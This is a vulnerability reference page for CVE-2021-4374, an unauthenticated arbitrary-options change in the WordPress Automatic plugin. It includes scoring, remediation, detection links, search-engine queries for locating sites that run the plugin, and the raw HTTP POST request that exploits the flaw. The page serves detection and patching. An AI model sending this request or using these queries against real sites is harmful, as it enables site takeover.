---
layout: post
cve_id: CVE-2021-4374
title: WordPress Automatic Plugin - Unauthenticated Options Change
pcap: true
pcap_path: /pcaps/2021/CVE-2021-4374.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-4374.yaml
snort2_rule: N/A
snort3_rule: N/A
author: intelligent-ears
severity: critical
impact: 'Unauthenticated attackers can update arbitrary WordPress options via process_form.php,
  enabling them to create administrator accounts, modify critical settings, or completely
  compromise the WordPress site.

  '
remediation: 'Upgrade to WordPress Automatic Plugin version 3.53.3 or later, or deactivate
  and delete the plugin.

  '
reference:
- https://www.wordfence.com/blog/2021/09/critical-vulnerability-fixed-in-wordpress-automatic-plugin/
- https://nvd.nist.gov/vuln/detail/CVE-2021-4374
classification:
  cve-id: CVE-2021-4374
  epss-score: 0.70297
  epss-percentile: 0.98631
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cwe-id: CWE-862
  cpe: cpe:2.3:a:valvepress:wordpress_automatic_plugin:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: valvepress
  product: wp-automatic
  fofa-query: wp-content/plugins/wp-automatic/
  google-query: inurl:"/wp-content/plugins/wp-automatic/"
  shodan-query: http.html:"wp-content/plugins/wp-automatic/"
tags:
- cve
- cve2021
- wp
- wordpress
- wp-plugin
- wp-automatic
- unauth
- intrusive
- vkev
---

## üîç Vulnerability Description
WordPress Automatic Plugin (versions 3.53.2 and below) contains a critical vulnerability that allows unauthenticated users to change arbitrary WordPress options through the process_form.php script. The vulnerable script uses update_option() on all POST parameters without authentication or capability checks, allowing attackers to create administrator accounts or modify critical settings. The vulnerability can be exploited even if the plugin is deactivated as it's a standalone script.


## üåê HTTP Request
```nohighlight
POST /wp-content/plugins/wp-automatic/process_form.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Connection: close
Content-Length: 126
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

field1=38ByGRGLDFxZxLU49BicwsuxK6F&field3=test&field4=test&field5=test&field6=test&blogdescription=38ByGRGLDFxZxLU49BicwsuxK6F
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

